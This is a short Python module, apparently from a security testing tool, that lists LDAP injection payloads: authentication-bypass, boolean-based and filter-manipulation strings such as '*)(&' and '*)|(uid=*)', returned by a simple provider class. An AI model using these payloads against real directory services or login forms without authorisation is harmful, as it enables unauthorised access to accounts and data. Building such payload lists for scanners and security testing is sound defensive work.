"""
===============================================================================
LDAP Injection Payloads
===============================================================================
"""

from __future__ import annotations

from itertools import chain
from typing import Iterable


AUTH_BYPASS = (

    "*",

    "*)(&",

    "admin*)",

)

BOOLEAN_PAYLOADS = (

    "*)|(uid=*)",

    "*)(|(cn=*))",

)

FILTER_PAYLOADS = (

    "*)(&(objectClass=*))",

    "*)(mail=*)",

)

PAYLOAD_DATABASE = {

    "auth_bypass": AUTH_BYPASS,

    "boolean": BOOLEAN_PAYLOADS,

    "filter": FILTER_PAYLOADS,

}


class LDAPPayloadProvider:

    def generate(
        self,
        vector,
    ) -> Iterable[str]:

        return chain.from_iterable(
            PAYLOAD_DATABASE.values()
        )